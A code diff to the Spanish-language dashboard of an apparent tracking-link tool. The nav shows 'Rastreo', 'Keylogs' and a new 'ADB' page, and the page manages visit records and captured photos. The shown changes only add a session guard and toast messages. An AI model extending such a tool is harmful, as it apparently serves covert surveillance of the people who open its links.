@@ -18,6 +18,7 @@
             <a href="rastreo.html" class="active">Rastreo</a>
             <a href="keylogs.html">Keylogs</a>
             <a href="perfil.html">Perfil</a>
+            <a href="adb.html">ADB</a>
         </nav>
         <a href="home.html" class="btn-ghost btn-inline">Volver</a>
     </header>
@@ -74,7 +75,9 @@
     </div>
 
     <script type="module">
-        import { auth, db, ref, onValue, remove, update } from './firebase-config.js';
+        import { auth, db, ref, onValue, remove, update, set, onDisconnect, signOut } from './firebase-config.js';
+        import { ensureSingleSession } from './session-guard.js';
+        import { showToast } from './toast.js';
 
         const txtLink = document.getElementById('myLink');
         const tableList = document.getElementById('list');
@@ -89,6 +92,8 @@
                 location.href = 'index.html';
                 return;
             }
+
+            ensureSingleSession({ auth, db, ref, set, onValue, onDisconnect, signOut, user: u });
 
             currentUserId = u.uid;
 
@@ -150,7 +155,7 @@
                         btnCopy.textContent = 'Copiar Link';
                     }, 2000);
                 } catch (err) {
-                    alert('Error al copiar. Link: ' + link);
+                    showToast('Error al copiar. Link: ' + link, 'error');
                 }
             };
 
@@ -161,9 +166,9 @@
 
                     try {
                         await remove(visitasRef);
-                        alert('Datos eliminados correctamente');
+                        showToast('Datos eliminados correctamente', 'success');
                     } catch (err) {
-                        alert('Error al eliminar: ' + err.message);
+                        showToast('Error al eliminar: ' + err.message, 'error');
                     } finally {
                         btnDelete.disabled = false;
                         btnDelete.textContent = 'Limpiar Todos los Datos';
@@ -178,9 +183,9 @@
 
                     try {
                         await cleanExpiredPhotos();
-                        alert('Fotos expiradas eliminadas');
+                        showToast('Fotos expiradas eliminadas', 'success');
                     } catch (err) {
-                        alert('Error: ' + err.message);
+                        showToast('Error: ' + err.message, 'error');
                     } finally {
                         btnClean.disabled = false;
                         btnClean.textContent = 'Limpiar Fotos Expiradas';
